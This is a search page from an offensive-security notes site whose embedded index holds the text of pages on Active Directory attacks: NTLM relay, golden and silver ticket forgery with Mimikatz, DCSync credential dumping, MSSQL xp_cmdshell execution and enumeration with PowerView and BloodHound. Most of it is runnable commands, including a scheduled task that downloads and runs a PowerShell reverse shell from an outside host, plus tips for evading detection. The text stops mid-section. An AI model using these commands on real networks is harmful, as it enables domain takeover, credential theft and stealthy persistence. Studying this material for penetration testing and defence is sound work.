<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Search | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Search" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Notes for an ethical hacker." />
<meta property="og:description" content="Notes for an ethical hacker." />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/search/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/search/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"Notes for an ethical hacker.","url":"http://0.0.0.0:4000/hackingnotes/search/","@type":"WebPage","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Search","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Hacking Notes</h2>
				<h3>Search</h3>
			</div>
			<article class="content">
				<p><span id="search-process">Loading</span> results <span id="search-query-container" style="display: none;">for "<strong id="search-query"></strong>"</span></p>
<ul id="search-results"></ul>

<script>
	window.data = {
		
			
				
					
					

					"active-directory-ad-attacks": {
						"id": "active-directory-ad-attacks",
						"title": "AD Attacks",
						"category": "",
						"url": " /active-directory/ad-attacks/",
						"content": "Without Credentials LLMNR NetBIOS Poisoning We can grab some hashed credentials if LLMNR protocol is enabled. sudo responder -I eth0 -Fw After some time we can get all the hashes. cd usr share responder sudo python DumpHash.py NTLM Relay (SMB signing disabled) Some tiems some server are misconfigured and have the smb signing disabled, so we can perform more attacks with responder. Configuration etc proxychains4.conf socks4 127.0.0.1 1080 usr share responder Responder.conf [Responder Core] ; Servers to start SMB = Off HTTP = On Perform the attack We need to get a list of the servers with the SMB sigining disabled. crackmapexec smb --gen-relay-list vulnerable_servers.txt 10.10.10.0 24 Execute the attack with Responder and Impacket. impacket-ntlmrelayx.py -tf . vulnerable_servers.txt -socks -smb2support sudo responder -I eth0 We can list the current sessions with the next command. ntlmrelayx&gt; socks When a session with administrative privileges is found we can use secretsdump or other tool with proxychains to use the session captured. proxychains impacket-secretdump DOMAIN admin@IP"
					}

					
				
			
		
			
				
					,
					

					"active-directory-cross-forest-attacks": {
						"id": "active-directory-cross-forest-attacks",
						"title": "Cross Forest Attacks",
						"category": "",
						"url": " /active-directory/cross-forest-attacks/",
						"content": "In this section we are going to abuse trusts between forests. Across Forest using Trust Tickets A trust ticket is a key which a DC of the other forest uses to decrypt the TGT presented by the attacker. That is the only check. We are going to execute a similar attack such as golden ticket but using the trust ticket instead of the krbtgt hash. To list the Trust tickets we can use mimikatz: Invoke-Mimikatz -Command '\"lsadump::trust patch\"' Invoke-Mimikatz -Command '\"lsadump::lsa patch\"' So an inter-forest TGT can be forged: Invoke-Mimikatz -Command '\"kerberos::golden user:Administrator domain:corp.local sid:S-1-5-21-268341927-4156871508-1792461683 rc4:cd3fb1b0b49c7a56d285fffdd1399231 service:krbtgt target:extcorp.local ticket:C:\\temp\\trust_forest_tkt.kirbi\"' Now we can request a TGS for cifs service on the dc of the trusted forest. .\\asktgs.exe c:\\temp\\trust_forest_tkt.kirbi CIFS dc01.extcorp.local And inject the ticket on the current session: .\\kirbikator.exe lsa .\\CIFS.dc01.extcorp.local.kirbi Note: We can not list all the file system of other forest. We can only list shared folders. ls \\\\dc01.extcorp.local\\share\\ Trust Abuse with MSSQL Server MSSQL Servers are generally deployed in plenty windows domain. SQL Servers provide very good options for lateral movement as domain users can be mapped to dabase roles. A fantastic tool to abuse MSSQL is PowerUpSQLl: https: github.com NetSPI PowerUpSQL Import-Module .\\PowerUpSQL.ps1 We can discover SQL servers: Get-SQLInstanceDomain We can check accessibility: Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose Gather information: Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose Database Links A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. In case of databases links between Microsoft SQL Servers, it is possible to execute stored procedures which means RCE. Database link works even across forest trusts. Get-SQLServerLink -Instance mssql.corp.local -Verbose So we can execute queries on the remote Server Link, see if this server has others links and above, instead of doing it manually that will be explained in a note, exists a script that crawls all the mssql server links. Get-SQLServerLinkCrawl -Instance mssql.corp.local -Verbose Note: Manual way: See if has a server link: select * from master..sysservers Openquery() function can be used to run quieries on a linked database: select * from openquery('sql2.corp.local', 'select * from master..sysservers') To execute commands from MSSQL server we need to use xp_cmdshell. If rpcout is enabled xp_cmdshell can be enabled using: EXECUTE('sp_configure \"xp_cmdshell\",1;reconfigure;') AT \"other-sql\" And finally: Get-SQLServerLinkCrawl -Instance mssql.corp.local -Query \"exec master..xp_cmdshell 'whoami'\""
					}

					
				
			
		
			
				
					,
					

					"active-directory-domain-enumeration": {
						"id": "active-directory-domain-enumeration",
						"title": "Domain Enumeration",
						"category": "",
						"url": " /active-directory/domain-enumeration/",
						"content": "In order to obtain information about our target domain we need to enumerate it. There are several ways to enumerate the domain with some kali tools, but in this section we are going to use PowerShell and the .NET framework. Domain Class: $ADClass = [System.DirectoryServices.ActiveDirectory.Domain] $ADClass::GetCurrentDomain() Exists multiple scripts to enumerate the domain. PowerView.ps1: https: github.com PowerShellMafia PowerSploit blob master Recon PowerView.ps1 ADModule: https: github.com samratashok ADModule Importing the module PowerView: First of all the module needs to be imported. Normally is not detected by AV, in case of detection, AMSI will need be evaded. Import-Module .\\PowerView.ps1 . .\\PowerView.ps1 ADModule: Its important to import first a .dll file if RSAT is not installed on the machine. Import-Module .\\Microsoft.ActiveDirectory.Management.dll Import-Module .\\ActiveDirectory\\ActiveDirectory.psd1 Current Domain PowerView: Get-NetDomain ADModule: Get-ADDomain Another Domain PowerView: Get-NetDomain -Domain corp.local ADModule: Get-ADDomain -Identity corp.local Domain SID PowerView: Get-DomainSID ADModule: We can find the SID inside the Get-ADDomain output. (Get-ADDomain).DomainSID Domain Policy PowerView: Get-DomainPolicy (Get-DomainPolicy).\"system access\" (Get-DomainPolicy -Domain corp.local).\"system access\" Domain Controllers PowerView: Get-NetDomainController Get-NetDomainController -Domain corp.local ADModule: Get-ADDomainController Get-ADDomainController -DomainName corp.local Users &amp; their Properties Attributes PowerView Get-NetUser Get-NetUser -Username &lt;user&gt; Get-UserProperty Get-UserProperty -Properties pwdlastset ADModule Get-ADUser -Filter * -Properties * Get-ADUser -Identity &lt;username&gt; -Properties * Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} Note: Some sysadmins paste the password on the description field. Search a particular string in users’s attributes Valuable info can be found in user’s attributes such as description. PowerView: Find-UserField -SearchField Description -SearchTerm \"built\" ADModule: Get-ADUser -Filter 'Description -like \"*built*\"' -Properties Description | select name,Description Computers in the domain PowerView: Get-NetComputer Get-NetComputer -OperatingSystem \"*Server 2016*\" Get-NetComputer -Ping Get-NetComputer -FullData ADModule: Get-ADComputer -Filter * | select Name Get-ADComputer -Filter 'OperatingSystem -like \"*Server 2016*\"' -Properties OperatingSystem | select Name,OperatingSystem Get-ADComputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} Get-ADComputer -Filter * -Properties * Domain Groups PowerView: Get-NetGroup Get-NetGroup -Domain &lt;targetdomain&gt; Get-NetGroup -FullData Note: It is also possible search for all groups containing a word: Get-NetGroup *admin* ADModule: Get-ADGroup -Filter * | select Name Get-ADGroup -Filter * -Properties * Note: It is also possible search for all groups containing a word: Get-ADGroup -Filter 'Name -like \"*admin*\"' | select Name Find memberships PowerView: Get-NetGroupMember -GroupName \"Domain Admins\" -Recurse Get-NetGroup -UserName \"username\" ADModule: Get-ADGroupMember -Identity \"Domain Admins\" -Recursive Get-ADPrincipalGroupMembership -Identity username Local Groups To do that task needs administrator privs on non-dc machines. PowerView: Get-NetLocalGroup -ComputerName dc01.corp.local -ListGroups Get-NetLocalGroup -ComputerName filesrv1.corp.local -ListGroups The following command shows the members of all the local groups on a machine. Get-NetLocalGroup -ComputerName filesrv1.corp.local -ListGroups -Recurse Logged Users (User has a session on) Like local groups to do that task needs administrator privs on non-dc machines. PowerView: Get actively logged users on a computer (needs local admin rights on the target) Get-NetLoggedon -ComputerName filesrv1.corp.local Get locally logged users on a computer (needs remote registry on the target (by default)) Get-LoggedonLocal -ComputerName filesrv1.corp.local Get the last logged user on a computer (needs local admin rights and remote registry on the target (by default)) Get-LastLoggedOn -ComputerName filesrv1.corp.local Find important targets Shares PowerView: Invoke-ShareFinder -Verbose Sensitive Files PowerView: Invoke-FileFinder -Verbose File servers PowerView: Get-NetFileServer Group Policy (GPO) Group Policy provides the ability to manage configuration and changes easily and centrally in active directory. PowerView: Get-NetGPO Get-NetGPO -ComputerName machine01.corp.local Get-NetGPO Group ADModule: Get-GPO -All Get-GPResultantSetOfPolicy -ReportType Html -Path c:\\windows\\temp\\report.html NOTE: We can get more infomration with: gpresult R V Users on Localgroups We can also get users which are in a local group of a machine using GPO. PowerView: Find-GPOComputerAdmin -Computer machine01.corp.local Or we can find machines where a user is member of a specific group. PowerView: Find-GPOLocation -UserName &lt;user&gt; -Verbose Organization Unit (OU) PowerView: Get-NetOU -FullData ADModule: Get-ADOrganizationalUnit -Filter * -Properties * To read which GPO is aplied to each OU, use the gplink value extracted from Get-NetOU. PowerView: Get-NetGPO -GPOname '{FD2B3AF5-356B-ADE4-98C1F4EF8081}' ADModule: Get-GPO -Guid FD2B3AF5-356B-ADE4-98C1F4EF8081 Access Control Model (ACL) Enables control on the ability of a process to access objects and other resources in active diectory based on: * **Access Tokens**: Security context of a process which contains the identity and privileges of a user. * **Security Descriptors**: SID of the owner , Discretionary ACL (DACL) and System ACL (SACL). It’s a list of Access Control Entities (ACE) which corresponds to an individual permission or audits access. Determines who has permission and what can be done on an object. Exists two types: * **DACL**: Defines the permissions trustees a user or group have on an object. * **SACL**: Logs sucess and failure audit messages when an object is accessed. ACLs are vital to security architecture of Active Directory. We can list the ACLs associated to a specified object, with a specified prefix, specified LDAP search or to specific path. PowerView: Get-ObjectAcl -SamAccountName &lt;username&gt; -ResolveGUIDs Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose Get-ObjectAcl -ADSpath \"LDAP: CN=Domain Admins,CN=Users,DC=corp,DC=local\" -ResolveGUIDS -Verbose Get-PathAcl -Path \"\\\\dc01.corp.local\\sysvol\" ADModule: (Get-Acl 'AD:\\CN=Administrator,CN=Users,DC=corp,DC=local').Access PowerView has a module named ACLScanner that finds interesting ACL such as ACL that are modified or ones which determines where and which object we can modify. PowerView: Invoke-ACLScanner -ResolveGUIDs Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"RDPUsers\"} Domain Trusts In an active directory environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest. Trust can be automatic for example parent-child, same forest, etc… or established manually. Trusted Domain Objects (TDOs) the trust relationship in a domain. Directions of Trust Exist diferent directions of Trust: One-Way Trust: It is unidirectional. Users in the trusted domain can access resources in the trusting domain but not backwards. Two-Way Trust: It is bidirectional. Users of both domains can access resources in the other domain Trust Transitivity Exist different types of transitivity on a domain: Transitive: Transitivie is a property of trust which means that the trust can be extended to etablish trust relationships with other domains. All the default intra-forest trust relationships such as Tree-Root or Parent-Child between domains within a same forest are transitive Two-Way trusts. Means that Domain A trusts Domain B and Domain B trusts Domain C so Domain A also trusts Domain C in a Two-Way Trust direction. Nontransitive: Nontransitive means that the trust can not be extended to other domains in the forest, we can find it on a two-way or one-way. This is the default trust called external trust between two domains in different forests, when forests do not have a trust relationship. Type of Trusts There are many types of trusts: Default Automatic Trusts Parent-Child: It is created automatically between the new domain an the domain that precedes it (parent-child trust) in the namespace hierarchy, whenever a domain is added in a tree. For example lab.corp.local is a child of corp.local. Always the trust is in a two-way transitive. Tree-Root: It is created automatically between whenever a new domain tree is added to a forest root. The trust is always two-way transitive. Shortcut Trust The shortcut trust is used to reduce access times in a complex trust scenarios. We can found it in a one-way or two-way transitive form. External Trusts An external trust gives the opportunity of trust between two domains in different forests which do not have any trust relationship. Can be one-way or two-way and is nontransitive. Forest Trust Forest trust is a trust between forest root domains. Cannot be extended to a third forest so has no implicit trust. Can be one-way or two-way and transitive or nontransitive. Note: In case of nonsensitvie Forest 1 would not have any type of trust relationship with Forest 3. Domain Trust Mapping We can get a list of all domain trusts for a domain. PowerView: Get-NetDomainTrust Get-NetDomainTrust -Domain es.lab.corp.local ADModule: Get-ADTrust Get-ADTrust -Identity es.lab.corp.local Forest Mapping We can get details about a forest: PowerView: Get-NetForest Get-NetForest -Forest extcorp.local ADModule: Get-ADForest Get-ADForest -Identity extcorp.local We can get all domains in a forest: PowerView: Get-NetForestDomain Get-NetForestDomain -Forest extcorp.local ADModule: (Get-ADForest).Domains We can get all global catalogs of a forest: PowerView: Get-NetForestCatalog Get-NetForestCatalog -Forest extcorp.local ADModule: Get-ADForest | select -ExpandProperty GlobalCatalogs We can get the map trusts of a forest: PowerView: Get-NetForestTrust Get-NetForestTrust -Forest extcorp.local ADModule: Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne \"$null\"' User Hunting Local Admin Check Find all machines on the current domain where the current user has local admin access. PowerView: Find-LocalAdminAccess -Verbose Note: This function queries the domain controller for a list of computers Get-NetComputer and then use multi-threaded Invoke-CheckLocalAdminAccess on each machine. MAKE A LOT OF NOISE In case Find-LocalAdminAccess is blocked you can use: Import-Module .\\Find-WMILocalAdminAccess.ps1 Find-WMILocalAdminAccess -ComputerName machine01.corp.local Find-WMILocalAdminAccess -ComputerFile .\\computers.txt -Verbose NOTE: WMI needs ADMIN PRIV to work, so if we get an error is that the user has not enough privileges. Get Local Admins (Local Admin Priv. needed) We can find local admins on all machines of the domain but we need administrator privileges on non-dc machines. PowerView: Invoke-EnumerateLocalAdmin -Verbose Note: This function queries the DC fo a list of computers Get-NetComputer an then use multi-threaded Get-NetLocalGroup on each machine. MAKE A LOT OF NOISE Machines where a User Group has session We can find computers where a domain admin or another specified user or group has an active session: PowerView: Invoke-UserHunter Invoke-UserHunter -GroupName \"RDPUsers\" Invoke-UserHunter -UserName \"john.brown\" Note: This function queries the DC for members of a given group using Get-NetGroupMember, gets a list of computers with Get-NetComputer and list sessions and logged users with Get-NetSession and Get-NetLoggedon from each machine. We can also confirm the admin access with: PowerView: Invoke-UserHunter -CheckAcces We can also find with Invoke-UserHunter where a domain admin is logged-in. PowerView: Invoke-UserHunter -Stealth Note: This option queries the DC for members of the given group using Get-NetGroupMember, gets a list of only of high traffic servers such as DC, File Servers and Distributed File Servers for less traffic generation and list sessions and logged on users with Get-NetSession and Get-NetLoggedon. MAKE NOISE BlueTeam Note: Netcease.ps1 is a script which change permission on the NetSessionEnum by removing permission to Authenticated Users group. https: github.com p0w3rsh3ll NetCease. The binary net.exe uses SAMR protocol, exists another script which hardens a server. https: vulners.com n0where N0WHERE:139229 BloodHound Provides GUI for AD entities and relationships for the data collected by its ingestors (SharpHound.ps1). https: github.com BloodHoundAD BloodHound First we need to run ingestors on a machine in order to collect data. . .\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All -Verbose Sometimes BloodHound miss to check the sessions so we can execute it manually. Invoke-BloodHound -CollectionMethod LoggedOn -Verbose Note: Remember that we can append the invoke command at the end of the file an executed it out of memory with iex (iwr ...) RedTeam Note: We can avoid detections like ATA with: Invoke-BloodHound -CollectionMethod All -ExcludeDC After execution download the .zip file and drop to BloodHound in order to import it."
					}

					
				
			
		
			
				
					,
					

					"active-directory-domain-persistence": {
						"id": "active-directory-domain-persistence",
						"title": "Domain Persistence",
						"category": "",
						"url": " /active-directory/domain-persistence/",
						"content": "There is much more in Active Directory than just a Domain Admin. Once we have domain admin privileges new avenues of persistence, escalation to enterprise admin and attacks across trust appears. These are some techniques to make a persistence on a domain. Golden Ticket A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. Since user account validation is not done by the KDC until TGT is older than 20 minutes. So we can use even deleted revoked accounts. To conclude, the krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine. First we need to obtain the krbtgt hash: Invoke-Mimikatz -Command '\"lsadump::lsa patch\"' -ComputerName dc.corp.local Invoke-Mimikatz -Command '\"lsadump::dcsync user:corp\\krbtgt\"' RedTeam Note: Using DCSync option does not need code execution on the target DC. For that reason is more silent than dumping the LSA. DCSync is a technique which allows an attacker to hijack the Domain Controller account and replicate data such as passwords of all domain controllers. After that we need to create the ticket. Invoke-Mimikatz Invoke-Mimikatz -Command '\"kerberos::golden User:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d id:500 groups:512 startoffset:0 endin:600 renewmax:10080 ptt\"' Invoke-Mimikatz -Command '\"kerberos::golden User:Administrator domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 krbtgt:a9b30e5b0dc865eadcea9411e4ade72d id:500 groups:512 startoffset:0 endin:600 renewmax:10080 ticket\"' Note: ptt injects the ticket in current PowerShell process. ticket saves the ticket to a file for later use. RedTeam Note: Avoid detection by creating a ticket with less duration than the maximum in kerberos policy. So create a ticket and inmediately use it. endin:600 Mimikatz by default create a ticket with 10 years of lifetime. The default AD setting is about 10 hours (10h * 60min = 600). renewmax:10080 Mimikatz by default create a ticket lifetime with 10 years of renewal. Default AD setting is 7 days (7d * 24h * 60min = 10080) Rubeus.exe .\\Rubeus.exe ptt ticket:ticket.kirbi Ticketer.py (impacket) python ticketer.py -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-268341927-4156873456-1784235843 -domain corp.local Administrator export KRB5CCNAME=. administrator.ccache python psexec.py corp.local Administrador@dc01.corp.local -k -no-pass Use klist to list all kerberos tickets: klist With a Golden Ticket we can access to any resource of the domain such as shared files (C$), and execute services and WMI, so we can user psexec or wmiexec to obtain a shell. ls \\\\dc01.corp.local\\c$ Note: A shell via WMI can not be obtained, so do not use PowerShell Remote. https: www.ired.team offensive-security-experiments active-directory-kerberos-abuse kerberos-golden-tickets https: book.hacktricks.xyz windows active-directory-methodology golden-ticket Silver Ticket A Silver Ticket is a valid TGS which is encrypted and signed by the NTLM hash of the service account of the service running with that account. Services will allow access only to the services themselves. This technique is a reasonable persistence because the ticket would be valid for 30 days in computer accounts (default). We are going to target the domain controller machine account. First we need the DC machine account hash. Invoke-Mimikatz -Command '\"lsadump::lsa patch\"' -ComputerName dc01 After that we need to create the ticket. Invoke-Mimikatz Invoke-Mimikatz -Command '\"kerberos::golden domain:corp.local sid:S-1-5-21-268341927-4156873456-1784235843 target:dc01.corp.local service:CIFS rc4:6f5b5acaf6744d567ac55e67ff22 user:Administrator id:500 groups:512 ptt\"' Note: Similar command can be used for any other service on a machine: CIFS, HOST, RPCSS, WSMAN… Use klist to list all kerberos tickets: klist And finally we can list the content of File System. ls \\\\dc01.corp.local\\c$ This table shows the available services: Service Type Service Silver Ticket WMI HOST RPCSS PowerShell Remoting HOST HTTP And Maybe: WSMAN RPCSS WinRM HOST HTTP And Maybe: WINRM Scheduled Tasks HOST Windows File Sharing, PsExec CIFS LDAP operations, DCSync LDAP Windows Remote Server Administration Tools RPCSS LDAP CIFS Golden Tickets krbtgt There are many ways of achieve command executing using Silver Ticket. Schedule and Execute a task We just need to create a ticket for the HOST SPN which will allow us to schedule a task on the target. And then schedule and execute a task. schtasks create S dc01.corp.local SC Weekly RU \"NT Authority\\SYSTEM\" TN \"STCheck\" TR \"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http: 10.10.10.10 Invoke-PowerShellTcp.ps1''')'\" schtasks Run S dc01.corp.local TN \"STCheck\" Note: In that case a Nishang Reverve TCP shell was spawned. Execute WMI queries To execute WMI queries we just need to create a ticket for the HOST and RPCSS. Get-WmiObject -Class win32_operatingsystem -ComputerName $Computer Invoke-WmiMethod win32_process -ComputerName $Computer -Name create -ArgumentList \"$RunCommand\" wmic dc01.corp.local list full format:list PsExec To run commands on other machine with PsExec we just need to create a ticket for CIFS service. .\\PsExec.exe -accepteula \\\\dc01.corp.local cmd PowerShell Remote With winrm access over a computer you can access it with PowerShell Remote. A ticket with HOST and WSMAN is needed. $sess = New-PSSession -ComputerName dc01.corp.local Enter-PSSession -Session $sess Dump DC database with DCSync We can dump DC database using DCSync by crafting a silver ticket with the LDAP SPN. Invoke-Mimikatz -Command '\"lsadump::dcsync dc:dc01.corp.local domain:corp.local user:krbtgt\"' Skeleton Key Skeleton Key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password. The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key Malware. All the publicly known methods are NOT persistent across reboots. RedTeam 